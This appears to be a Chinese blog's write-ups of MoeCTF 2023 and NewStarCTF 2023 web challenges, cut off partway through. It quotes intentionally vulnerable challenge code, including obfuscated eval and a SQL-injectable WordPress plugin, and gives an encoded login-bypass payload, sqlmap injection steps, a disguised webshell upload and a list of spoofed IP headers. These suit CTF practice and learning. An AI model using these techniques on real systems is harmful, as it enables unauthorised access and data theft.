class="line">            <span class="keyword">continue</span></span><br><span class="line">        c ^= <span class="built_in">int</span>.from_bytes(hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;salt&#125;</span>[<span class="subst">&#123;item&#125;</span>]<span class="subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="string">&quot;big&quot;</span>) <span class="comment"># it looks so complex! but is it safe enough?</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(c)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> users</span><br><span class="line"><span class="keyword">assert</span> users[<span class="string">&quot;admin&quot;</span>] == <span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line">hashed_users = <span class="built_in">dict</span>((k,gethash(k,v)) <span class="keyword">for</span> k,v <span class="keyword">in</span> users.items())</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">int</span>.to_bytes(<span class="number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="number">160</span>,<span class="string">&quot;big&quot;</span>,signed=<span class="literal">True</span>).decode().translate(&#123;<span class="built_in">ord</span>(c):<span class="literal">None</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;\x00&quot;</span>&#125;)) <span class="comment"># what is it?</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data:<span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            data = base64.b64encode(data).decode() <span class="comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">__page__ = base64.b64encode(<span class="string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.path == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                self.send_response(<span class="number">200</span>)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(__page__)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send_response(<span class="number">404</span>)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(<span class="string">b&quot;404 Not Found&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            self.send_response(<span class="number">500</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(<span class="string">b&quot;500 Internal Server Error&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.path == <span class="string">&quot;/login&quot;</span>:</span><br><span class="line">                body = self.rfile.read(<span class="built_in">int</span>(self.headers.get(<span class="string">&quot;Content-Length&quot;</span>)))</span><br><span class="line">                payload = json.loads(body)</span><br><span class="line">                params = json.loads(decrypt(payload[<span class="string">&quot;params&quot;</span>]))</span><br><span class="line">                <span class="built_in">print</span>(params)</span><br><span class="line">                <span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">                    self.send_response(<span class="number">403</span>)</span><br><span class="line">                    self.end_headers()</span><br><span class="line">                    self.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == params.get(<span class="string">&quot;password&quot;</span>):</span><br><span class="line">                    self.send_response(<span class="number">403</span>)</span><br><span class="line">                    self.end_headers()</span><br><span class="line">                    self.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;same&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                hashed = gethash(params.get(<span class="string">&quot;username&quot;</span>),params.get(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users.items():</span><br><span class="line">                    <span class="keyword">if</span> hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            <span class="string">&quot;user&quot;</span>:k,</span><br><span class="line">                            <span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        self.send_response(<span class="number">200</span>)</span><br><span class="line">                        self.end_headers()</span><br><span class="line">                        self.wfile.write(json.dumps(data).encode())</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                self.send_response(<span class="number">403</span>)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(<span class="string">b&quot;Invalid username or password&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send_response(<span class="number">404</span>)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(<span class="string">b&quot;404 Not Found&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            self.send_response(<span class="number">500</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(<span class="string">b&quot;500 Internal Server Error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    server = http.server.HTTPServer((<span class="string">&quot;&quot;</span>, <span class="number">9999</span>), MyHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>不太懂，唯一读懂的就是post传入的值必须是经过5次base64加密过的，并且<code>username</code>和<code>password</code>值不能相等，随便输了一组相等的数字，然后提示YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!，把<code>username</code>值的引号去掉后，竟然直接成功了，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJGNlJsWlZiR2h2VkZaRmQyTkVUbGhXYldoUVdsY3hVbVZWT1ZsaVIwWlNUVWR6ZVZVeFpIZFNiVlpHVFZaU1ZHRnRjems9   #编码前&#123;&quot;username&quot;:111,&quot;password&quot;:&quot;111&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/10/moectf2023-web/11-1.png"></p><h2 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h2><p>一眼目录扫描，发现&#x2F;flag，访问是个假的，还有唯一的就是WordPress，WordPress下的漏洞主要就是插件的sql注入漏洞，那么我们就可以扫描<code>/wordpress/wp-content/plugins/</code>目录，扫到visitor-logging&#x2F;logger.php,访问这个文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: Visitor auto recorder</span></span><br><span class="line"><span class="comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span></span><br><span class="line"><span class="comment">Author: KoKoMi</span></span><br><span class="line"><span class="comment">  Still in development! :)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不许偷看！这些代码我还在调试呢！</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载数据库配置，暂时用硬编码绝对路径</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="string">&#x27;wp-config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_user</span> = DB_USER; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$db_password</span> = DB_PASSWORD; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$db_name</span> = DB_NAME; <span class="comment">// 数据库名称</span></span><br><span class="line"><span class="variable">$db_host</span> = DB_HOST; <span class="comment">// 数据库主机</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span></span><br><span class="line"><span class="comment">// 这些是临时的代码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$user_agent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_agent&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;time&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$db_host</span>, <span class="variable">$db_user</span>, <span class="variable">$db_password</span>, <span class="variable">$db_name</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据库连接失败: &#x27;</span> . <span class="variable">$mysqli</span>-&gt;connect_error;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;<span class="subst">$ip</span>&#x27;, &#x27;<span class="subst">$user_agent</span>&#x27;, <span class="subst">$time</span>)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行插入</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查插入是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据插入成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据插入失败: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$mysqli</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$mysqli</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//gpt真好用</span></span><br><span class="line">数据插入失败: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> &#x27;)&#x27; <span class="title">at</span> <span class="title">line</span> 1</span><br></pre></td></tr></table></figure><p>很明显这是个sql注入点post传值，将$ip，$user_agent，$time的值先一个一个试，发现注入点是time，sqlmap一把梭，位置：<code>wordpress-&gt;secret_of_kokomi</code></p><p><img src="/2023/10/10/moectf2023-web/12-1.png"></p><h2 id="meoworld"><a href="#meoworld" class="headerlink" title="meoworld"></a>meoworld</h2><p>不会。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛事复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023 web</title>
      <link href="/2023/10/02/NewStarCTF2023-web/"/>
      <url>/2023/10/02/NewStarCTF2023-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="NewStarCTF-web"><a href="#NewStarCTF-web" class="headerlink" title="NewStarCTF web"></a>NewStarCTF web</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="泄露的秘密"><a href="#泄露的秘密" class="headerlink" title="泄露的秘密"></a>泄露的秘密</h3><p>直接用disearch扫描，拿到robots.txt和<a href="http://www.zip,拼接得到完整的flag/">www.zip,拼接得到完整的flag</a></p><p>flag{r0bots_1s_s0_us3ful_4nd_<a href="http://www.zip_1s_s0_d4ng3rous}/">www.zip_1s_s0_d4ng3rous}</a></p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>先创建txt文件，写入一句话木马，在上传时得知，只允许图片形式，将文件改为jpg图片后缀，上传时，抓包，改包，如下：</p><p><img src="/2023/10/02/NewStarCTF2023-web/1-1.png"></p><p>然后用蚁剑进入后门即可：</p><p><img src="/2023/10/02/NewStarCTF2023-web/1-2.png"></p><p>在这个文件中得到flag，flag{2e5dd867-8ece-4cfd-9044-3ebf96f1558c}</p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>根据提示一步一步来，需要注意的是最后的本地访问时，X-Forwarded-For失效，下面的伪造头一个一个试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line"> </span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">True-Client-Ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{75906422-b701-4fe8-803f-89be1ada5fd6}</p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>很简单，直接将参数的值故意输错，看报错就行：</p><p><img src="/2023/10/02/NewStarCTF2023-web/4-1.png"></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 